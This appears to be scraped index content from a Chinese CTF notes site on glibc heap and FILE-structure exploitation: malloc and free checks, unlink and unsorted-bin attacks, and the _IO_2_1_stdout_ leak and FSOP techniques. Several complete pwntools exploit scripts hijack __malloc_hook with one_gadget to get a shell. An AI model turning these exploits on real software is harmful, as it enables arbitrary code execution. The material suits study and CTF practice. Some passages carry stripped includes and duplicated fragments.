块 __int_free 初始检查 检查目标 检查条件 报错信息 释放 chunk 位置 (uintptr_t) p > (uintptr_t) -size \\ \\ misaligned_chunk(p) free(): invalid pointer 释放 chunk 的大小 size \\ !aligned_OK(size) free(): invalid size fastbin 检查目标 检查条件 报错信息 释放 chunk 的下一个 chunk 大小 chunksize_nomask(chunk_at_offset(p, size)) = av->system_mem free(): invalid next size (fast) 释放 chunk 对应链表的第一个 chunk fb = &fastbin(av, idx)，old= *fb， old == p double free or corruption (fasttop) fastbin 索引 old != NULL && old_idx != idx invalid fastbin entry (free) non-mmapped 块检查 检查目标 检查条件 报错信息 释放 chunk 位置 p == av->top double free or corruption (top) next chunk 位置 contiguous (av) && (char ) nextchunk >= ((char ) av->top + chunksize(av->top)) double free or corruption (out) next chunk 大小 chunksize_nomask (nextchunk) \\ nextsize >= av->system_mem free(): invalid next size (normal) unlink 检查目标 检查条件 报错信息 size vs prev_size chunksize(P) != prev_size (next_chunk(P)) corrupted size vs. prev_size Fd, bk 双向链表检查 FD->bk != P \\ \\ BK->fd != P corrupted double-linked list nextsize 双向链表 P->fd_nextsize->bk_nextsize != P \\ \\ P->bk_nextsize->fd_nextsize != P corrupted double-linked list (not small) "},"pwn/heap_related/unlink攻击敏感指针/unlink攻击敏感指针.html":{"url":"pwn/heap_related/unlink攻击敏感指针/unlink攻击敏感指针.html","title":"unlink攻击敏感指针","keywords":"","body":"unlink源码 unlink本质：从双链表中取出元素。 #define unlink(AV, P, BK, FD) { \\ if (__builtin_expect (chunksize(P) != (next_chunk(P))->prev_size, 0)) \\ malloc_printerr (check_action, \"corrupted size vs. prev_size\", P, AV); \\ FD = P->fd; \\ BK = P->bk; \\ if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) \\ malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); \\ else { \\ FD->bk = BK; \\ BK->fd = FD; \\ if (!in_smallbin_range (P->size) \\ && __builtin_expect (P->fd_nextsize != NULL, 0)) { \\ if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0) \\ || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0)) \\ malloc_printerr (check_action, \\ \"corrupted double-linked list (not small)\", \\ P, AV); \\ if (FD->fd_nextsize == NULL) { \\ if (P->fd_nextsize == P) \\ FD->fd_nextsize = FD->bk_nextsize = FD; \\ else { \\ FD->fd_nextsize = P->fd_nextsize; \\ FD->bk_nextsize = P->bk_nextsize; \\ P->fd_nextsize->bk_nextsize = FD; \\ P->bk_nextsize->fd_nextsize = FD; \\ } \\ } else { \\ P->fd_nextsize->bk_nextsize = P->bk_nextsize; \\ P->bk_nextsize->fd_nextsize = P->fd_nextsize; \\ } \\ } \\ } \\ } 主要检查 堆块大小一致检查 if (__builtin_expect (chunksize(P) != (next_chunk(P))->prev_size, 0)) \\ malloc_printerr (check_action, \"corrupted size vs. prev_size\", P, AV); 双链表完整性检查 if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) \\ malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);\\ FD->bk==P BK->fd==P 保证了双链表的双向连接 攻击代码示例 free机制触发unlink改写指针内容 攻击效果:一个指针的内容变成指针地址-0x18，同时造成了堆块的重叠。 ptr = ptr_addr - 0x18 #include #include #include #include long long list[30]={0}; int main() { char *p = malloc(0x80); char *q = malloc(0x80); char *r = malloc(0x80); list[0] = p; *(long *) p = 0; *(long *) (p+8) = 0x81; *(long *) (p+0x10) = list - 0x3; *(long *) (p+0x18) = list - 0x2; *(long *) (q-0x10) = 0x80; *(long *) (q-8) = 0x90; //=====================line================== free(q); return 0; } free(q)前： free(q)触发unlink后 可以看到list[0]已经被修改了。 ps： 由于堆块检查 if (__builtin_expect (chunksize(P) != (next_chunk(P))->prev_size, 0)) \\ malloc_printerr (check_action, \"corrupted size vs. prev_size\", P, AV); 只需要满足 (chunksize(P) == (next_chunk(P))->prev_size就行，size也可以这样伪造 "},"pwn/heap_related/unsorted_bin相关攻击/unsorted_bin相关攻击.html":{"url":"pwn/heap_related/unsorted_bin相关攻击/unsorted_bin相关攻击.html","title":"unsorted_bin相关攻击","keywords":"","body":"unsorted bin的来源 当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。 释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于 top chunk 的解释，请参考下面的介绍。 当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。 基本使用情况 Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取。 在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。 通过unsorted bin把堆申请到栈上 示例代码 #include #include #include #include int main() { intptr_t stack_buffer[4] = {0}; intptr_t *p1; p1 = malloc(0x100); malloc(0x10); free(p1); p1[1] = &stack_buffer; // p1->bk = stack_buffer_addr stack_buffer[1] = 0x120; //stack_buffer->size = 0x120 stack_buffer[3] = &stack_buffer; // stack_buffer->bk = stack_buffer_addr //====================================line===================================== malloc(0x110); } 攻击示意图 这里stack_buffer->bk也可以伪造成其他的值，需要是能够合法访问的地址就行，会把这个地址当作堆块链在unsorted bin上。 通过unsorted bin attack实现一个任意地址的大数字（unsorted bin的地址）写 示例代码 #include #include #include #include int main() { intptr_t stack_buffer[4] = {0}; intptr_t *p1; p1 = malloc(0x100); malloc(0x200); free(p1); p1[1] = &stack_buffer; // p1->bk = stack_buffer_addr malloc(0x100); if(stack_buffer[2]>0x10000)system(\"echo success!!!\"); } 最终效果是stack_buffer[2]的地方被我们写成一个大数字（unsorted bin的地址） 攻击示意图 "},"pwn/heap_related/_IO_2_1_stdout_泄露内存/_IO_2_1_stdout_泄露内存.html":{"url":"pwn/heap_related/_IO_2_1_stdout_泄露内存/_IO_2_1_stdout_泄露内存.html","title":"IO_2_1_stdout泄露内存","keywords":"","body":"在做heap时有时候并没有自带的输出模块，所以打IO_2_1_stdout\\成了一种常用手段。一般只出现在glibc2.23版本下glibc2.27下aslr随机的位数比较多爆破概率比较小，没算错的话应该时1/4096，而2.23的情况下是1/16。 这里记录两道例题，也忘了是哪里的题了，反正模板题。以便以后快速复现把 一道off-by-one配合_IO_2_1_stdout，一道double free配合_IO_2_1_stdout 例题1 关键字：IO_2_1_stdout\\、off-by-one 功能很少，就一个add和delete，add的时候存在off-by-one 核心是堆块的布局，通过off-by-one修改堆块的大小来造成堆块的堆叠(smallbin和fastbin重叠)。具体构造见exp。 泄露之后既可以通过double free来劫持__malloc_hook（exp1），也可以故技重施来劫持__malloc_hook(exp2)，最后在申请一次堆块就能getshell 比较关键的点：add(2,0x50,'\\xdd\\xb5')，这里虽然申请0x60大小的堆，但由于unsortedbin中的堆块大小为0x70，glibc为了防止碎片过多malloc到的堆块大小为0x70。 exp1 from pwn import * context.update(arch='amd64',os='linux',timeout=1) context.log_level='debug' libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") one_gadget=[0x45226,0x4527a,0xf0364,0xf1207] def add(index,size,content='\\x00'): p.sendlineafter('>>>\\n','1') p.sendlineafter('idx:\\n',str(index)) p.sendlineafter('len:\\n',str(size)) p.sendafter('content:\\n',content) def delete(index): p.sendlineafter('>>>\\n','2') p.sendlineafter('idx:\\n',str(index)) def pr(a,addr): log.success(a+'===>'+hex(addr)) def pwn(): add(0,0x20) add(1,0x20) add(2,0x60) add(3,0x20) delete(0) delete(2) add(0,0x28,'a'*0x28+'\\xa1') delete(1) add(1,0x20) add(2,0x50,'\\xdd\\xb5') add(4,0x60) add(5,0x60,'a'*0x33+p64(0xfbad1800)+p64(0)*3+'\\x00') #=========================leak============================= p.recv(0x40) leak = u64(p.recv(8)) libcbase = leak - 0x3c5600 malloc_hook = libcbase + libc.sym['__malloc_hook'] one = libcbase + one_gadget[3] pr('libcbase',libcbase) #========================================================== add(6,0x60) delete(2) delete(6) delete(4) add(7,0x60,p64(malloc_hook-0x23)) add(8,0x60) add(9,0x60) add(10,0x60,'a'*0x13+p64(one)) #gdb.attach(p) p.interactive() while True: try: global p p = process('./pwn') pwn() break except: p.close() print 'trying...' exp2 from pwn import * context.update(arch='amd64',os='linux',timeout=1) context.log_level='debug' libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") one_gadget=[0x45226,0x4527a,0xf0364,0xf1207] def add(index,size,content): p.sendlineafter('>>>\\n','1') p.sendlineafter('idx:\\n',str(index)) p.sendlineafter('len:\\n',str(size)) p.sendafter('content:\\n',content) def delete(index): p.sendlineafter('>>>\\n','2') p.sendlineafter('idx:\\n',str(index)) def pr(str1,addr): log.success(str1+'===>'+hex(addr)) def pwn(): add(0,0x28,'\\x00') add(1,0x28,'\\x00') add(2,0x60,'\\x00') add(3,0x28,'\\x00') delete(0) delete(2) add(0,0x28,'a'*0x28+'\\xa1') delete(1) add(1,0x28,'\\x00') add(2,0x50,'\\xdd\\xb5') add(2,0x60,'\\x00') add(2,0x60,'a'*0x33+p64(0xfbad1800)+p64(0)*3+'\\x00') p.recv(0x40) leak = u64(p.recv(8)) libcbase = leak - 0x3c5600 pr('libcbase',libcbase) for i in range(4): one_gadget[i] += libcbase pr('one_gadget'+str(i),one_gadget[i]) malloc_hook = libcbase + libc.sym['__malloc_hook'] pr('malloc_hook',malloc_hook) #gdb.attach(p) add(0,0x28,'\\x00') add(1,0x28,'\\x00') add(2,0x60,'\\x00') add(3,0x28,'\\x00') delete(0) delete(2) add(0,0x28,'a'*0x28+'\\xa1') delete(1) add(1,0x28,'\\x00') add(2,0x50,p64(malloc_hook-0x23)) add(2,0x60,'\\x00') add(2,0x60,'a'*0x13+p64(one_gadget[3])) p.interactive() while True: try: global p p = process('./pwn') pwn() break except: p.close() print 'trying...' 例题二：nepctf sooooeasy 关键字：IO_2_1_stdout\\、double free 逻辑也很简单，只有add和delete，存在double free，本来想double free修改size来做，但这样会变得很麻烦，而且申请的堆块太多了，大于题目要求，看了wp发现了更好的堆块分布，确实是非常好的利用思路。 exp from pwn import* #context.log_level = 'debug' context.update(arch='amd64',os='linux',timeout=0.5) #p = remote('',) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def add(name_size,name='a',message='b'): p.sendlineafter('choice : ','1') p.sendlineafter('your name: \\n',str(name_size)) p.sendafter('Your name:\\n',name) p.sendlineafter('Your message:\\n',message) def delete(idx): p.sendlineafter('choice : ','2') p.sendlineafter('index:',str(idx)) def pr(a,addr): log.success(a+'===>'+hex(addr)) def pwn(): add(0x60) add(0x90) add(0x60) delete(1) add(0x60,'\\xdd\\x25') delete(0) delete(2) delete(0) add(0x60,'\\x00') add(0x60) add(0x60) add(0x60) add(0x60,'a'*0x33+p64(0xfbad1800)+p64(0)*3+'\\x00') libcbase=u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))-0x3c5600 libc_realloc = libcbase + libc.sym['__libc_realloc'] malloc_hook = libcbase + libc.sym['__malloc_hook'] one = libcbase + [0x45226,0x4527a,0xf0364,0xf1207][1] pr('libcbase',libcbase) pr('malloc_hook',malloc_hook) pr('one',one) delete(0) delete(2) delete(0) add(0x60,p64(malloc_hook-0x23)) add(0x60) add(0x60) add(0x60,'a'*11+p64(one)+p64(libc_realloc+13)) p.sendlineafter('choice : ','1') #gdb.attach(p,'b *'+str(one)) p.interactive() while True: try: global p p = process('./sooooeasy') pwn() break except: p.close() print 'trying...' "},"pwn/FILE_related/":{"url":"pwn/FILE_related/","title":"FILE_related","keywords":"","body":""},"pwn/FILE_related/close_free/fog.html":{"url":"pwn/FILE_related/close_free/fog.html","title":"fog","keywords":"","body":"记录一道有趣的题目，利用flose来实现free操作从而造成uaf。 glibc2.23 堆块在编辑的时候存在off-by-null 执行flose的函数，为了绕过验证让它能够再次free，flags位需要伪造。 exp： from pwn import* context.log_level = 'debug' p = process('./fog') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def pr(a,addr): log.success(a+'====>'+hex(addr)) def add(size,ct='a'): p.sendlineafter('choice?\\n','1') p.sendlineafter('want?\\n',str(size)) p.sendafter(': \\n',ct) def delete(idx): p.sendlineafter('choice?\\n','2') p.sendlineafter('delete?\\n',str(idx)) def edit(idx,ct): p.sendlineafter('choice?\\n','3') p.sendafter('?\\n',str(idx)) p.sendafter('?\\n',ct) def show(idx): p.sendlineafter('choice?\\n','4') p.sendlineafter('?\\n',str(idx)) def read_flag(): p.sendlineafter('choice?\\n','5') def write_flag(): p.sendlineafter('choice?\\n','6') read_flag() write_flag() p.sendlineafter('choice?\\n','1') p.sendlineafter('want?\\n',str(size)) show(0) p.recvuntil('Content : ') libcbase = u64(p.recv(6)+'\\x00\\x00') - (0x7f8215a0ad98-0x7f8215646000) malloc_hook = libcbase + libc.sym['__malloc_hook'] one = libcbase + 0x4527a pr('libcbase',libcbase) pr('malloc_hook',malloc_hook) delete(0) add(0x68,p64(0)) write_flag() edit(0,p64(malloc_hook-0x23)) add(0x68) add(0x68,'a'*0x13+p64(one)) p.sendlineafter('choice?\\n','1') p.sendline('16') #gdb.attach(p) p.interactive() "},"pwn/FILE_related/FILE攻击的一些进阶操作_待补充/FILE攻击的一些进阶操作_待补充.html":{"url":"pwn/FILE_related/FILE攻击的一些进阶操作_待补充/FILE攻击的一些进阶操作_待补充.html","title":"FILE攻击的一些进阶操作_待补充","keywords":"","body":"﻿## FILE_advance glibc2.24中加入了对vtable劫持的检测 在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用_IO_vtable_check 做进一步检查。 /* Check if unknown vtable pointers are permitted; otherwise, terminate the process. */ void _IO_vtable_check (void) attribute_hidden; /* Perform vtable pointer validation. If validation fails, terminate the process. */ static inline const struct _IO_jump_t * IO_validate_vtable (const struct _IO_jump_t *vtable) { /* Fast path: The vtable pointer is within the __libc_IO_vtables section. */ uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; uintptr_t ptr = (uintptr_t) vtable; uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables; if (__glibc_unlikely (offset >= section_length)) /* The vtable pointer is not in the expected section. Use the slow path, which will terminate the process if necessary. */ _IO_vtable_check (); return vtable; } 计算 section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;，紧接着会判断 vtable - __start___libc_IO_vtables 的 offset ，如果这个 offset 大于 section_length , 即大于 __stop___libc_IO_vtables - __start___libc_IO_vtables 那么就会调用 _IO_vtable_check() 这个函数。 void attribute_hidden _IO_vtable_check (void) { #ifdef SHARED /* Honor the compatibility flag. */ void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables); #ifdef PTR_DEMANGLE PTR_DEMANGLE (flag); #endif if (flag == &_IO_vtable_check) return; /* In case this libc copy is in a non-default namespace, we always need to accept foreign vtables because there is always a possibility that FILE * objects are passed across the linking boundary. */ { Dl_info di; struct link_map *l; if (_dl_open_hook != NULL || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0 && l->l_ns != LM_ID_BASE)) return; } #else /* !SHARED */ /* We cannot perform vtable validation in the static dlopen case because FILE * handles might be passed back and forth across the boundary. Therefore, we disable checking in this case. */ if (__dlopen != NULL) return; #endif __libc_fatal (\"Fatal error: glibc detected an invalid stdio handle\\n\"); } 如果 vtable 是非法的，那么会引发 abort。 这里的检查使得以往使用 vtable 进行利用的技术很难实现 所以需要去寻找新的利用方式 fwrite 先给出fwrite执行的大致流程图 执行过程中的进行实际操作的函数符号(方便在源码中寻找)： _IO_fwrite==>_IO_new_file_xsputn==>_IO_new_file_overflow==>_IO_new_do_write==>new_do_write==> _IO_SYSWRITE 这里给出angelboy的一种泄露方式 各个需要检查的位置 Set _flags & ~_IO_NO_WRITES Set _flags |= _IO_CURRENTLY_PUTTING #define _IO_NO_WRITES 8 #define _IO_CURRENTLY_PUTTING 0x800 ... int _IO_new_file_overflow (_IO_FILE *f, int ch) { if (f->_flags & _IO_NO_WRITES) /* SET ERROR */ { f->_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; } /* If currently reading or no buffer allocated. */ if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL) { ... } if (ch == EOF) return _IO_do_write (f, f->_IO_write_base, f->_IO_write_ptr - f->_IO_write_base); // Set _IO_read_end == _IO_write_base static _IO_size_t new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do) { _IO_size_t count; if (fp->_flags & _IO_IS_APPENDING) ... else if (fp->_IO_read_end != fp->_IO_write_base) { ... } count = _IO_SYSWRITE (fp, data, to_do); // 演示程序 #include #include #include int main(){ char *msg = \"secret\"; FILE *fp; char *buf = malloc(100); read(0,buf,100); fp = fopen(\"key.txt\",\"rw\"); //================================================= fp->_flags &= ~8; fp->_flags |= 0x800; fp->_flags |= _IO_IS_APPENDING; fp->_IO_write_base = msg; fp->_IO_write_ptr = msg+6; fp->_IO_read_end = fp->_IO_write_base; fp->_fileno = 1; //================================================= fwrite(buf,1,100,fp); } 运行结果 fread 给出fread执行的大致流程图 一种写入方式 Set read_base == read_ptr _IO_size_t _IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n) { ... have = fp->_IO_read_end - fp->_IO_read_ptr; if (want _IO_buf_base && want _IO_buf_end - fp->_IO_buf_base))//buffer size must be larger than read size { if (__underflow (fp) == EOF) ... } ... } Set _flags & ~_IO_NO_READS #define _IO_NO_READS 4 ... int _IO_new_file_underflow (_IO_FILE *fp) { ... if (fp->_flags & _IO_NO_READS) { ... return EOF; } ... count = _IO_SYSREAD (fp, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base);// 演示程序 #include #include #include int main(){ FILE *fp; char *buf = malloc(100); char msg[100]; fp = fopen(\"key.txt\",\"rw\"); //================================================= fp->_flags &= ~4; fp->_IO_buf_base = msg; fp->_IO_buf_end = msg+100; fp->_fileno = 0; //================================================= fread(buf,1,6,fp); puts(msg); } 运行结果 "},"pwn/FILE_related/FILE结构体概述/FILE结构体概述.html":{"url":"pwn/FILE_related/FILE结构体概述/FILE结构体概述.html","title":"FILE结构体概述","keywords":"","body":"﻿ FILE结构 FILE结构体的定义（截自/glibc2.23/libio/libio.h） struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ #define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; #if 0 int _blksize; #else int _flags2; #endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */ #define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock; #ifdef _IO_USE_OLD_IO_FILE }; 进程中的 FILE 结构会通过chain 域彼此连接形成一个链表，链表头部用全局变量IO_list_all 表示，通过这个值我们可以遍历所有的 FILE 结构。 在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于 libc.so 的数据段。而我们使用 fopen 创建的文件流是分配在堆内存上的。 我们可以在 libc.so 中找到 stdin\\stdout\\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是IO_2_1_stderr IO_2_1_stdout IO_2_1_stdin 其在glibc中的声明（/glibc2.23/libio/libio.h） extern struct _IO_FILE_plus _IO_2_1_stdin_; extern struct _IO_FILE_plus _IO_2_1_stdout_; extern struct _IO_FILE_plus _IO_2_1_stderr_; 但是事实上 _IO_FILE 结构外包裹着另一种结构 _IO_FILE_plus，其中包含了一个重要的指针 vtable 指向了一系列函数指针。在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8。 struct _IO_FILE_plus { _IO_FILE file; const struct _IO_jump_t *vtable; }; IO_jump_t结构体的定义(/glibc2.23/libio/libio.h) struct _IO_jump_t { JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue); #if 0 get_column; set_column; #endif }; _IO_2_1_stdin_、_IO_2_1_stdout_、_IO_2_1_stderr_这三个默认开启的_IO_FILE_plus结构的vtable默认指向_IO_file_jumps。（不可被修改） const struct _IO_jump_t _IO_file_jumps = { JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_file_finish), JUMP_INIT(overflow, _IO_file_overflow), JUMP_INIT(underflow, _IO_file_underflow), JUMP_INIT(uflow, _IO_default_uflow), JUMP_INIT(pbackfail, _IO_default_pbackfail), JUMP_INIT(xsputn, _IO_file_xsputn), JUMP_INIT(xsgetn, _IO_file_xsgetn), JUMP_INIT(seekoff, _IO_new_file_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_new_file_setbuf), JUMP_INIT(sync, _IO_new_file_sync), JUMP_INIT(doallocate, _IO_file_doallocate), JUMP_INIT(read, _IO_file_read), JUMP_INIT(write, _IO_new_file_write), JUMP_INIT(seek, _IO_file_seek), JUMP_INIT(close, _IO_file_close), JUMP_INIT(stat, _IO_file_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue) }; 这里gdb中解析出的函数符号稍微有点奇怪，有些在glibc中找不到声明。 (注：所有带_GI\\的需要去掉这部分) 例： __xsgetn = 0x7ffff7a85ed0 ，glibc中的函数符号是_IO_file_xsgetn。(不知道为何gdb解析出来的符号会不太一样，反正就挺秃然的.......) gdb-peda$ p _IO_file_jumps $1 = { __dummy = 0x0, __dummy2 = 0x0, __finish = 0x7ffff7a869d0 , __overflow = 0x7ffff7a87740 , __underflow = 0x7ffff7a874b0 , __uflow = 0x7ffff7a88610 , __pbackfail = 0x7ffff7a89990 , __xsputn = 0x7ffff7a861f0 , __xsgetn = 0x7ffff7a85ed0 , __seekoff = 0x7ffff7a854d0 , __seekpos = 0x7ffff7a88a10 , __setbuf = 0x7ffff7a85440 , __sync = 0x7ffff7a85380 , __doallocate = 0x7ffff7a7a190 , __read = 0x7ffff7a861b0 , __write = 0x7ffff7a85b80 , __seek = 0x7ffff7a85980 , __close = 0x7ffff7a85350 , __stat = 0x7ffff7a85b70 , __showmanyc = 0x7ffff7a89b00 , __imbue = 0x7ffff7a89b10 } 几个常用的函数： fread fread 是标准 IO 库函数，作用是从文件流中读数据，函数原型如下 size_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ; buffer 存放读取数据的缓冲区。 size：指定每个记录的长度。 count： 指定记录的个数。 stream：目标文件流。 返回值：返回读取到数据缓冲区中的记录个数 实现主要功能的函数(/glibc2.23/libio/fileops.c) _IO_size_t _IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n); 大致流程图 fwrite fwrite 同样是标准 IO 库函数，作用是向文件流写入数据，函数原型如下 size_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream); buffer: 是一个指针，对 fwrite 来说，是要写入数据的地址; size: 要写入内容的单字节数; count: 要进行写入 size 字节的数据项的个数; stream: 目标文件指针; 返回值：实际写入的数据项个数 count。 大致流程图 fopen fopen 在标准 IO 库中用于打开文件，函数原型如下 FILE *fopen(char *filename, *type); filename: 目标文件的路径 type: 打开方式的类型 返回值: 返回一个文件指针 在 fopen 内部会创建 FILE 结构并进行一些初始化操作，下面来看一下这个过程 首先在 fopen 对应的函数__fopen_internal 内部会调用 malloc 函数，分配 FILE 结构的空间。因此我们可以获知 FILE 结构是存储在堆上的 *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE)); 之后会为创建的 FILE 初始化 vtable，并调用_IO_file_init 进一步初始化操作 _IO_JUMPS (&new_f->fp) = &_IO_file_jumps; _IO_file_init (&new_f->fp); 在IO_file_init 函数的初始化操作中,会调用_IO_link_in 把新分配的 FILE 链入_IO_list_all 为起始的 FILE 链表中 void _IO_link_in (fp) struct _IO_FILE_plus *fp; { if ((fp->file._flags & _IO_LINKED) == 0) { fp->file._flags |= _IO_LINKED; fp->file._chain = (_IO_FILE *) _IO_list_all; _IO_list_all = fp; ++_IO_list_all_stamp; } } 之后_fopen_internal 函数会调用_IO_file_fopen 函数打开目标文件，_IO_file_fopen 会根据用户传入的打开模式进行打开操作，总之最后会调用到系统接口 open 函数，这里不再深入。 if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL) return __fopen_maybe_mmap (&new_f->fp.file); 总结一下 fopen 的操作是 使用 malloc 分配 FILE 结构 设置 FILE 结构的 vtable 初始化分配的 FILE 结构 将初始化的 FILE 结构链入 FILE 结构链表中 调用系统调用打开文件 大致流程图 fclose fclose 是标准 IO 库中用于关闭已打开文件的函数，其作用与 fopen 相反。 int fclose(FILE *stream); fclose 是标准 IO 库中用于关闭已打开文件的函数，其作用与 fopen 相反。 int fclose(FILE *stream) 功能：关闭一个文件流，使用 fclose 就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区 fclose 首先会调用_IO_unlink_it 将指定的 FILE 从_chain 链表中脱链 if (fp->_IO_file_flags & _IO_IS_FILEBUF) _IO_un_link ((struct _IO_FILE_plus *) fp); 之后会调用_IO_file_close_it 函数，_IO_file_close_it 会调用系统接口 close 关闭文件 if (fp->_IO_file_flags & _IO_IS_FILEBUF) status = _IO_file_close_it (fp); 最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构 _IO_FINISH (fp); 大致流程图 IO_un_link ((struct _IO_FILE_plus *) fp); 之后会调用\\_IO\\_file\\_close_it 函数，\\_IO\\_file\\_close\\_it 会调用系统接口 close 关闭文件 ​```c if (fp->_IO_file_flags & _IO_IS_FILEBUF) status = _IO_file_close_it (fp); 最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构 _IO_FINISH (fp); 大致流程图 "},"pwn/FILE_related/FSOP/FSOP.html":{"url":"pwn/FILE_related/FSOP/FSOP.html","title":"FSOP","keywords":"","body":"﻿# FSOP   进程内所有的_IO_FILE结构会使用_chain域相互连接形成一个链表，这个链表的头部由_IO_list_all维护。 ​   FSOP的核心思想就是劫持_IO_list_all的值来伪造链表和其中的_IO_FILE项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all链表中所有项的文件流，相当于对每个FILE调用fflush，也对应着会调用_IO_FILE_plus.vtable中的_IO_overflow。 _IO_flush_all_lockp的触发方式 1.当libc执行abort流程时 2.当执行exit函数时 3.当执行流从main函数返回时 _IO_flush_all_lockp的触发流程图 由源码可以知道为了在执行_IO_flush_all_lockp函数时能够跳转到vtable上的__overflow（64位下偏移为0x18），我们需要伪造的地方 1，_IO_list_all指针的值 使其指向我们伪造的_IO_FILE_plus结构 2，fp->_mode 满足条件fp->_mode 3，fp->_IO_write_ptr ，fp->_IO_write_base 满足条件fp->_IO_write_ptr > fp->_IO_write_base 4，vtable偏移量为0x18的地方 填入onegadget或者system FSOP攻击图解 演示代码 #define mode_offset 0xc0 #define writeptr_offset 0x28 #define writebase_offset 0x20 #define vtable_offset 0xd8 int main(void) { void *ptr; long long *list_all_ptr; ptr=malloc(0x200); *(long long*)((long long)ptr+mode_offset)=0x0; *(long long*)((long long)ptr+writeptr_offset)=0x1; *(long long*)((long long)ptr+writebase_offset)=0x0; *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100); *(long long*)((long long)ptr+0x100+24)=0x41414141; list_all_ptr=(long long *)_IO_list_all; list_all_ptr[0]=ptr; exit(0); } 执行到exit(0)的时候触发了_IO_flush_all_lockp，gdb运行结果： 